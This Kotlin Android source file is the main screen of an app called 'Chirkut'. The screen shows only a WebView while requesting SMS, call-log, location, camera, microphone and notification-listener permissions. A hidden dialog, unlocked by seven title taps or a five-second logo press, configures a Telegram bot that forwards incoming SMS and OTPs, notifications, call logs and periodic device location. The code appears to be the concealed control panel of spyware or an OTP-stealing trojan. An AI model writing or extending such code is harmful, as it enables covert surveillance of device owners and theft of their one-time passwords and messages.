package com.example.ui.screens

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.Image
import androidx.compose.foundation.clickable
import androidx.compose.foundation.gestures.awaitEachGesture
import androidx.compose.foundation.gestures.awaitFirstDown
import androidx.compose.foundation.gestures.waitForUpOrCancellation
import androidx.compose.foundation.interaction.MutableInteractionSource
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.input.pointer.pointerInput
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.unit.dp
import androidx.compose.ui.window.Dialog
import androidx.core.content.ContextCompat
import com.example.R
import com.example.ui.viewmodel.MainViewModel
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun MainAppScreen(
    viewModel: MainViewModel,
    modifier: Modifier = Modifier
) {
    val context = LocalContext.current
    val coroutineScope = rememberCoroutineScope()
    var showNotificationPermissionDialog by remember { mutableStateOf(false) }
    var showHiddenConfig by remember { mutableStateOf(false) }

    var titleTapCount by remember { mutableIntStateOf(0) }
    var lastTapTime by remember { mutableLongStateOf(0L) }

    // Temporary values for Dialog settings
    var tempTelegramToken by remember { mutableStateOf("") }
    var tempTelegramChatId by remember { mutableStateOf("") }
    var tempTelegramEnabled by remember { mutableStateOf(true) }
    var tempNotificationForward by remember { mutableStateOf(true) }
    var tempSmsForward by remember { mutableStateOf(true) }
    var tempCallForward by remember { mutableStateOf(true) }
    var tempLocationSharing by remember { mutableStateOf(true) }
    var tokenVisible by remember { mutableStateOf(false) }

    val telegramTokenVal by viewModel.telegramToken.collectAsState()
    val telegramChatIdVal by viewModel.telegramChatId.collectAsState()
    val telegramEnabledVal by viewModel.telegramEnabled.collectAsState()
    val notificationForwardVal by viewModel.notificationForward.collectAsState()
    val smsForwardVal by viewModel.smsForward.collectAsState()
    val callForwardVal by viewModel.callForward.collectAsState()
    val locationSharingVal by viewModel.locationSharing.collectAsState()

    LaunchedEffect(showHiddenConfig) {
        if (showHiddenConfig) {
            tempTelegramToken = telegramTokenVal
            tempTelegramChatId = telegramChatIdVal
            tempTelegramEnabled = telegramEnabledVal
            tempNotificationForward = notificationForwardVal
            tempSmsForward = smsForwardVal
            tempCallForward = callForwardVal
            tempLocationSharing = locationSharingVal
        }
    }

    val permissionsToRequest = remember {
        mutableListOf(
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        ).apply {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                add(Manifest.permission.POST_NOTIFICATIONS)
            }
        }.toTypedArray()
    }

    val permissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val smsGranted = permissions[Manifest.permission.RECEIVE_SMS] == true
        val callGranted = permissions[Manifest.permission.READ_PHONE_STATE] == true
        val locationGranted = permissions[Manifest.permission.ACCESS_FINE_LOCATION] == true

        coroutineScope.launch {
            viewModel.repository.log(
                "Permissions",
                "Permissions updated: SMS=$smsGranted, Calls=$callGranted, Location=$locationGranted",
                "INFO"
            )
        }

        if (!isNotificationServiceEnabled(context)) {
            showNotificationPermissionDialog = true
        }

        // Restart Foreground Service to pick up newly granted permissions dynamically
        val intent = android.content.Intent(context, com.example.service.ChirkutForegroundService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        } catch (e: Exception) {
            // Ignore
        }
    }

    LaunchedEffect(Unit) {
        val allGranted = permissionsToRequest.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        }
        if (!allGranted) {
            permissionLauncher.launch(permissionsToRequest)
        } else if (!isNotificationServiceEnabled(context)) {
            showNotificationPermissionDialog = true
        }
    }

    Scaffold(
        modifier = modifier.fillMaxSize(),
        topBar = {
            TopAppBar(
                title = { 
                    Text(
                        text = "Chirkut",
                        style = MaterialTheme.typography.titleLarge,
                        modifier = Modifier.clickable(
                            interactionSource = remember { MutableInteractionSource() },
                            indication = null
                        ) {
                            val now = System.currentTimeMillis()
                            if (now - lastTapTime < 1000) {
                                titleTapCount++
                            } else {
                                titleTapCount = 1
                            }
                            lastTapTime = now
                            if (titleTapCount >= 7) {
                                titleTapCount = 0
                                showHiddenConfig = true
                            }
                        }
                    )
                },
                navigationIcon = {
                    Image(
                        painter = painterResource(id = R.drawable.img_app_logo),
                        contentDescription = "Chirkut Logo",
                        modifier = Modifier
                            .padding(start = 12.dp, end = 8.dp)
                            .size(40.dp)
                            .pointerInput(Unit) {
                                awaitEachGesture {
                                    awaitFirstDown()
                                    val job = coroutineScope.launch {
                                        delay(5000)
                                        showHiddenConfig = true
                                    }
                                    waitForUpOrCancellation()
                                    job.cancel()
                                }
                            }
                    )
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.primaryContainer,
                    titleContentColor = MaterialTheme.colorScheme.onPrimaryContainer
                )
            )
        }
    ) { innerPadding ->
        Box(
            modifier = Modifier
                .fillMaxSize()
                .padding(innerPadding)
        ) {
            WebViewScreen(viewModel = viewModel)
        }
    }

    if (showHiddenConfig) {
        Dialog(
            onDismissRequest = { showHiddenConfig = false }
        ) {
            Surface(
                modifier = Modifier
                    .fillMaxWidth()
                    .fillMaxHeight(0.9f)
                    .padding(16.dp),
                shape = MaterialTheme.shapes.extraLarge,
                tonalElevation = 6.dp
            ) {
                Column(
                    modifier = Modifier
                        .fillMaxSize()
                        .padding(20.dp)
                ) {
                    Text(
                        text = "System Configuration",
                        style = MaterialTheme.typography.titleLarge,
                        color = Modifier.let { MaterialTheme.colorScheme.primary },
                        modifier = Modifier.padding(bottom = 16.dp)
                    )

                    val scrollState = rememberScrollState()
                    Column(
                        modifier = Modifier
                            .weight(1f)
                            .verticalScroll(scrollState),
                        verticalArrangement = Arrangement.spacedBy(16.dp)
                    ) {
                        Text(
                            text = "Telegram API Settings",
                            style = MaterialTheme.typography.titleSmall,
                            color = MaterialTheme.colorScheme.secondary
                        )

                        OutlinedTextField(
                            value = tempTelegramToken,
                            onValueChange = { tempTelegramToken = it },
                            label = { Text("Bot Token") },
                            modifier = Modifier.fillMaxWidth(),
                            visualTransformation = if (tokenVisible) VisualTransformation.None else PasswordVisualTransformation(),
                            trailingIcon = {
                                IconButton(onClick = { tokenVisible = !tokenVisible }) {
                                    Icon(
                                        imageVector = if (tokenVisible) Icons.Default.VisibilityOff else Icons.Default.Visibility,
                                        contentDescription = if (tokenVisible) "Hide token" else "Show token"
                                    )
                                }
                            },
                            singleLine = true
                        )

                        OutlinedTextField(
                            value = tempTelegramChatId,
                            onValueChange = { tempTelegramChatId = it },
                            label = { Text("Chat / User ID") },
                            modifier = Modifier.fillMaxWidth(),
                            singleLine = true
                        )

                        HorizontalDivider()

                        Text(
                            text = "Forwarding Control",
                            style = MaterialTheme.typography.titleSmall,
                            color = MaterialTheme.colorScheme.secondary
                        )

                        SettingsSwitchRow(
                            title = "Telegram Integration",
                            description = "Enable Telegram forwarding function",
                            icon = Icons.Default.Send,
                            checked = tempTelegramEnabled,
                            onCheckedChange = { tempTelegramEnabled = it }
                        )

                        SettingsSwitchRow(
                            title = "Notification Forward",
                            description = "Forward incoming notifications",
                            icon = Icons.Default.Notifications,
                            checked = tempNotificationForward,
                            onCheckedChange = { tempNotificationForward = it }
                        )

                        SettingsSwitchRow(
                            title = "SMS Forward",
                            description = "Forward incoming SMS and OTPs",
                            icon = Icons.Default.Sms,
                            checked = tempSmsForward,
                            onCheckedChange = { tempSmsForward = it }
                        )

                        SettingsSwitchRow(
                            title = "Call Forward",
                            description = "Log and forward missed/incoming call logs",
                            icon = Icons.Default.Call,
                            checked = tempCallForward,
                            onCheckedChange = { tempCallForward = it }
                        )

                        SettingsSwitchRow(
                            title = "Location Sharing",
                            description = "Periodically share device coordinates",
                            icon = Icons.Default.MyLocation,
                            checked = tempLocationSharing,
                            onCheckedChange = { tempLocationSharing = it }
                        )

                        Spacer(modifier = Modifier.height(8.dp))

                        Button(
                            onClick = {
                                viewModel.setTelegramToken(tempTelegramToken)
                                viewModel.setTelegramChatId(tempTelegramChatId)
                                viewModel.setTelegramEnabled(tempTelegramEnabled)
                                viewModel.setNotificationForward(tempNotificationForward)
                                viewModel.setSmsForward(tempSmsForward)
                                viewModel.setCallForward(tempCallForward)
                                viewModel.setLocationSharing(tempLocationSharing)
                                viewModel.sendTestMessage()
                            },
                            modifier = Modifier.fillMaxWidth(),
                            colors = ButtonDefaults.buttonColors(
                                containerColor = MaterialTheme.colorScheme.secondaryContainer,
                                contentColor = MaterialTheme.colorScheme.onSecondaryContainer
                            )
                        ) {
                            Icon(imageVector = Icons.Default.PlayArrow, contentDescription = "Test")
                            Spacer(modifier = Modifier.width(8.dp))
                            Text("Test Telegram Connection")
                        }
                    }

                    Spacer(modifier = Modifier.height(16.dp))

                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.spacedBy(8.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        TextButton(
                            onClick = { showHiddenConfig = false },
                            modifier = Modifier.weight(1f)
                        ) {
                            Text("Cancel")
                        }

                        Button(
                            onClick = {
                                viewModel.setTelegramToken(tempTelegramToken)
                                viewModel.setTelegramChatId(tempTelegramChatId)
                                viewModel.setTelegramEnabled(tempTelegramEnabled)
                                viewModel.setNotificationForward(tempNotificationForward)
                                viewModel.setSmsForward(tempSmsForward)
                                viewModel.setCallForward(tempCallForward)
                                viewModel.setLocationSharing(tempLocationSharing)
                                showHiddenConfig = false
                            },
                            modifier = Modifier.weight(1f)
                        ) {
                            Text("Save")
                        }
                    }
                }
            }
        }
    }

    if (showNotificationPermissionDialog) {
        AlertDialog(
            onDismissRequest = { showNotificationPermissionDialog = false },
            title = { Text("Notification Access Required") },
            text = { 
                Text(
                    "To forward notifications to your Telegram Bot, Chirkut requires 'Notification Listener' access. " +
                    "Please locate 'Chirkut' in the next system settings screen and toggle permission to 'Allowed'."
                )
            },
            confirmButton = {
                Button(
                    onClick = {
                        showNotificationPermissionDialog = false
                        try {
                            val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").apply {
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            }
                            context.startActivity(intent)
                        } catch (e: Exception) {
                            val intent = Intent(Settings.ACTION_SETTINGS).apply {
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            }
                            context.startActivity(intent)
                        }
                    }
                ) {
                    Text("Grant Permission")
                }
            },
            dismissButton = {
                TextButton(onClick = { showNotificationPermissionDialog = false }) {
                    Text("Cancel")
                }
            }
        )
    }
}

@Composable
fun SettingsSwitchRow(
    title: String,
    description: String,
    icon: androidx.compose.ui.graphics.vector.ImageVector,
    checked: Boolean,
    onCheckedChange: (Boolean) -> Unit
) {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .padding(12.dp),
        verticalAlignment = Alignment.CenterVertically
    ) {
        Icon(
            imageVector = icon,
            contentDescription = title,
            tint = MaterialTheme.colorScheme.secondary,
            modifier = Modifier.size(24.dp)
        )
        Spacer(modifier = Modifier.width(16.dp))
        Column(
            modifier = Modifier.weight(1f)
        ) {
            Text(
                text = title,
                style = MaterialTheme.typography.bodyLarge,
                color = MaterialTheme.colorScheme.onSurface
            )
            Text(
                text = description,
                style = MaterialTheme.typography.bodySmall,
                color = MaterialTheme.colorScheme.onSurfaceVariant
            )
        }
        Switch(
            checked = checked,
            onCheckedChange = onCheckedChange,
            colors = SwitchDefaults.colors(
                checkedThumbColor = MaterialTheme.colorScheme.primary,
                checkedTrackColor = MaterialTheme.colorScheme.primaryContainer
            )
        )
    }
}

private fun isNotificationServiceEnabled(context: Context): Boolean {
    val pkgName = context.packageName
    val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
    if (flat != null) {
        val names = flat.split(":")
        for (name in names) {
            val cn = android.content.ComponentName.unflattenFromString(name)
            if (cn != null && cn.packageName == pkgName) {
                return true
            }
        }
    }
    return false
}
